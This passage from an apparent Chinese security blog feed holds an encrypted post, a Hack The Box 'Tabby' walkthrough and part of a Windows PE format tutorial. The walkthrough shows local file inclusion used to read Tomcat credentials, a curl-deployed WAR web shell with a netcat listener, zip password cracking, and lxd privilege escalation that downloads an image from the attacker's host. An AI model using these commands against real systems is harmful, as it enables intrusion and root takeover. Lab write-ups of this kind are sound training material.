style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">The article has been encrypted, please enter your password to view.&lt;br&gt;</summary>
    
    
    
    
    <category term="渗透" scheme="http://422926799.github.io/tags/渗透/"/>
    
  </entry>
  
  <entry>
    <title>Hack the box tabby</title>
    <link href="http://422926799.github.io/posts/5c929347.html"/>
    <id>http://422926799.github.io/posts/5c929347.html</id>
    <published>2020-07-08T07:36:16.000Z</published>
    <updated>2020-07-08T08:18:04.137Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://s1.ax1x.com/2020/07/08/UVG59A.png" alt=""></p><h2 id="入口点获取"><a href="#入口点获取" class="headerlink" title="入口点获取"></a>入口点获取</h2><p>端口扫描</p><pre><code>nmap --min-rate=10000 -A -sC 10.10.10.194</code></pre><p>扫描结果：</p><pre><code>Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-07 06:23 EDTNmap scan report for 10.10.10.194Host is up (0.20s latency).Not shown: 873 closed ports, 124 filtered portsPORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Mega Hosting8080/tcp open  http    Apache Tomcat|_http-open-proxy: Proxy might be redirecting requests|_http-title: Apache TomcatService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><p>80是个静态站点，8080是Tomcat，扫描目录无果，在点击某个页面的时候看见一个file参数，一开始无法访问。加入hosts即可<br><img src="https://s1.ax1x.com/2020/07/08/UVt0hQ.png" alt=""></p><p>访问之后提醒，站点曾经大量泄漏<br><img src="https://s1.ax1x.com/2020/07/08/UVtI39.png" alt=""></p><p>尝试LEFI，成功<br><img src="https://s1.ax1x.com/2020/07/08/UVNCut.png" alt=""><br>得到用户名:ash</p><p>版本发现<br><img src="https://s1.ax1x.com/2020/07/08/UVNE4g.png" alt=""></p><p>尝试访问有趣的路径</p><pre><code>/proc/self/environ/proc/self/fd/var/log/apache2/access.log/var/log/apache2/error.log</code></pre><p>并无结果</p><p>尝试读取news.php发现也不行<br><img src="https://s1.ax1x.com/2020/07/08/UVNRKI.png" alt=""></p><p>google一艘，发现一个tomcat的路径：<br><img src="https://s1.ax1x.com/2020/07/08/UVUoex.png" alt=""></p><pre><code>/usr/share/tomcat9/etc/tomcat-users.xml</code></pre><p>访问后得到想要的结果<br><img src="https://s1.ax1x.com/2020/07/08/UVUTw6.png" alt=""></p><p>登录Tomcat<br><img src="https://s1.ax1x.com/2020/07/08/UVaPk8.png" alt=""></p><h2 id="立足点"><a href="#立足点" class="headerlink" title="立足点"></a>立足点</h2><p>tomcat上传war getshell<br><a href="https://payloads.online/archivers/2017-08-17/2" target="_blank" rel="noopener">https://payloads.online/archivers/2017-08-17/2</a> - 渗透中tomcat部署war包Getshell</p><p>使用curl getshell</p><pre><code>curl -u &#39;tomcat&#39;:&#39;$3cureP4s5w0rd123!&#39; -T shell.war &#39;http://10.10.10.194:8080/manager/text/deploy?path=/tests&#39; #上传war包为haqshellcurl -u &#39;tomcat&#39;:&#39;$3cureP4s5w0rd123!&#39; http://10.10.10.194:8080/manager/text/list #列出部署的war本机监听：nc -lvvp &lt;lport&gt; 浏览器访问：http://10.10.10.194:8080/tests</code></pre><p><img src="https://s1.ax1x.com/2020/07/08/UVaI3Q.png" alt=""></p><p>在web目录找到backup.zip,使用fcrackzip破解</p><pre><code>fcrackzip -D -p /usr/share/wordlists/rockyou.txt backup.zip</code></pre><p><img src="https://s1.ax1x.com/2020/07/08/UVdmgH.png" alt=""></p><p>尝试使用爆破出来的密码登录ssh，捞走users.txt<br><img src="https://s1.ax1x.com/2020/07/08/UVaqH0.png" alt=""></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>查看ash用户组是lxd<br><img src="https://s1.ax1x.com/2020/07/08/UVdgxJ.png" alt=""></p><p>提权参考：<a href="https://www.hackingarticles.in/lxd-privilege-escalation/" target="_blank" rel="noopener">https://www.hackingarticles.in/lxd-privilege-escalation/</a></p><p>过程：</p><pre><code>git clone  https://github.com/saghul/lxd-alpine-builder.gitcd lxd-alpine-builder./build-alpinewget http://10.10.14.207:8000/alpine-v3.12-x86_64-20200707_0941.tar.gzlxc image import ./alpine-v3.12-x86_64-20200707_0941.tar.gz --alias myimagelxc init myimage ignite -c security.privileged=truelxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=truelxc start ignitelxc exec ignite /bin/sh</code></pre><p><img src="https://s1.ax1x.com/2020/07/08/UVwniT.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/07/08/UVwwSe.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/07/08/UVwywt.png" alt=""></p><h2 id="过程的知识点"><a href="#过程的知识点" class="headerlink" title="过程的知识点"></a>过程的知识点</h2><p><img src="https://s1.ax1x.com/2020/07/08/UV0Hud.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://s1.ax1x.com/2020/07/08/UVG59A.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;入口点获取&quot;&gt;&lt;a href=&quot;#入口点获取&quot; class=&quot;headerlink&quot; title=&quot;入口点获取&quot;&gt;&lt;/a&gt;入口点</summary>
      
    
    
    
    
    <category term="htb" scheme="http://422926799.github.io/tags/htb/"/>
    
  </entry>
  
  <entry>
    <title>windows PE学习</title>
    <link href="http://422926799.github.io/posts/c925c057.html"/>
    <id>http://422926799.github.io/posts/c925c057.html</id>
    <published>2020-07-05T03:57:15.000Z</published>
    <updated>2020-07-05T04:43:32.793Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PE介绍"><a href="#PE介绍" class="headerlink" title="PE介绍"></a>PE介绍</h2><p>PE（Portable Execute）文件是Windows下可移植可执行文件的总称，常见的有DLL，EXE，OCX，SYS等，事实上，一个文件是否是PE文件与其扩展名无关。本文要说的PE文件结构，就是指的Window可移植可执行文件结构。</p><h2 id="PE文件结构"><a href="#PE文件结构" class="headerlink" title="PE文件结构"></a>PE文件结构</h2><p>PE文件具有较强的移植性；<br>PE结构是一种数据组织方式；<br>PE结构主要应用于windows系统；<br>具有PE结构的文件称为PE文件；<br>EXE、DLL都是PE文件；</p><ol><li>完整的PE文件主要有4个部分组成：DOS头，PE头，节表以及节数据。</li><li>DOs头部主要用于对非PE格式文件的处理，DOS时代遗留的产物，是PE文件的一个遗传；</li><li>PE头部部分用于宏观上记录文件的一些信息，，运行平台，大小，创建日期，属性等；</li><li>节表部分用于对各种类型的数据进行定义分段；</li><li>节数据不言而喻就是文件的数据部分，实际上我们编写程序的过程中就是对该部分的数据进行编写。而其他的部分则是由编译器依照我们编写的部分进行相应的填写而得到的。</li></ol><p>整个结构如下<br><img src="https://s1.ax1x.com/2020/07/05/USWiq0.png" alt=""></p><p>解析过程：DOS头-&gt;PE头-&gt;节段(包括导入表那些)-&gt;运行</p><h2 id="DOS头解析"><a href="#DOS头解析" class="headerlink" title="DOS头解析"></a>DOS头解析</h2><p>e_magic头部是固定的，用于表示这是个二进制可执行文件。</p><pre><code>IMAGE_DOS_HEADER {    WORD   e_magic;                // +0000h   -   EXE标志，“MZ”    WORD   e_cblp;                 // +0002h   -   最后（部分）页中的字节数    WORD   e_cp;                   // +0004h   -   文件中的全部和部分页数    WORD   e_crlc;                 // +0006h   -   重定位表中的指针数    WORD   e_cparhdr;              // +0008h   -   头部尺寸，以段落为单位    WORD   e_minalloc;             // +000ah   -   所需的最小附加段    WORD   e_maxalloc;             // +000ch   -   所需的最大附加段    WORD   e_ss;                   // +000eh   -   初始的SS值（相对偏移量）    WORD   e_sp;                   // +0010h   -   初始的SP值    WORD   e_csum;                 // +0012h   -   补码校验值    WORD   e_ip;                   // +0014h   -   初始的IP值    WORD   e_cs;                   // +0016h   -   初始的CS值    WORD   e_lfarlc;               // +0018h   -   重定位表的字节偏移量    WORD   e_ovno;                 // +001ah   -   覆盖号    WORD   e_res[4];               // +001ch   -   保留字00    WORD   e_oemid;                // +0024h   -   OEM标识符    WORD   e_oeminfo;              // +0026h   -   OEM信息    WORD   e_res2[10];             // +0028h   -   保留字    LONG   e_lfanew;               // +003ch   -   PE头相对于文件的偏移地址  }</code></pre><p><img src="https://s1.ax1x.com/2020/07/05/USWMs1.png" alt=""></p><ul><li>用黄色框框框住的是Dos头部，绿色框框框住的是Dos字节块；</li><li>Dos字节块大小是不固定的。</li></ul><p>Dos头：长度40h；<br>Dos块：长度不定，DOS插桩代码，是DOS下的16位程序代码，只是为了显示上面的提示数据。这段代码是编译器在程序编译过程中自动添加的。</p><p>Dos头里最重要的是e_lfanew字段，也就是Dos头最后四个字符，表示了PE头的偏移地址。<br>PE地址=Dos头部地址+偏移地址</p><p>Ps：这里的e_lfanew字段为：000000E8（在内存里要从右往左读，高位在右边，低位在左边）。<br><img src="https://s1.ax1x.com/2020/07/05/USWfLq.png" alt=""></p><p>通过计算可以得到PE头部地址<br><img src="https://s1.ax1x.com/2020/07/05/USWIoT.png" alt=""></p><h2 id="PE头解析"><a href="#PE头解析" class="headerlink" title="PE头解析"></a>PE头解析</h2><pre><code>typedef struct _IMAGE_FILE_HEADER { WORD Machine; WORD NumberOfSections; DWORD TimeDateStamp; DWORD PointerToSymbolTable; DWORD NumberOfSymbols; WORD SizeOfOptionalHeader; WORD Characteristics; } IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</code></pre><p><img src="https://s1.ax1x.com/2020/07/05/USWHW4.png" alt=""></p><ul><li>50 45固定PE头标识；</li><li>Machine为014C -&gt; 处理器为x86；</li></ul><p><img src="https://s1.ax1x.com/2020/07/05/USWzTK.md.png" alt=""></p><ul><li>段数目这里为5；</li><li>段表相对偏移E0；</li><li>EXE/DLL。</li></ul><p>可选头部：<br><img src="https://s1.ax1x.com/2020/07/05/USfFld.png" alt=""></p><ul><li>0B 01 -&gt; 32位程序；</li><li>00002000 -&gt; 程序开始执行的入口地址；</li><li>ImageBase(文件映射到内存的基地址) -&gt; 00002000；</li><li>SectionAlignment(内存中段对齐地址) -&gt; 0000000A；</li><li>FileAlignment(文件中段对齐地址) -&gt; 0000000A；</li><li>MajorSubsystemVersion(所需的windows系统版本) -&gt; 0A00 -&gt; 十进制 10 （为UWP）；</li></ul><p><img src="https://s1.ax1x.com/2020/07/05/USfnk8.png" alt=""></p><ul><li>SizeOfImage(所需内存总大小) -&gt; 01171A；</li><li>SizeofHeaders(头部的总大小) -&gt; 000200</li><li>SubSystem(驱动/GUI/命令行) -&gt; 2000</li><li>NumberOfRvaAndSizes(数据目录个数) -&gt; 00000010</li></ul><p>数据目录项:</p><pre><code>IMAGE_DATA_DIRECTORY {    DWORD   VirtualAddress;                 // +0000h   -   数据的起始RVA    DWORD   Size;                           // +0004h   -   数据块的长度}</code></pre><p>ImportSva(导入表相对虚拟地址) -&gt;  00004000<br>可选头中定义了如下重要信息：</p><pre><code>* 所有含代码的节的总大小* 所有含已初始化数据的节的总大小* 所有含未初始化数据的节的大小* 程序执行入口RVA* 代码的节的起始RVA* 数据的节的起始RVA* 程序的建议装载地址* 内存中的节的对齐粒度* 文件中的节的对齐粒度* 内存中整个PE映像尺寸* 所有头＋节表的大小* 导出表* 导入表* 资源* 重定位表* 调试信息* 版权信息* 导入函数地址表</code></pre><p>这么说导入表和导出表算在可选头，emmm…<br><img src="https://s1.ax1x.com/2020/07/05/USfUtU.png" 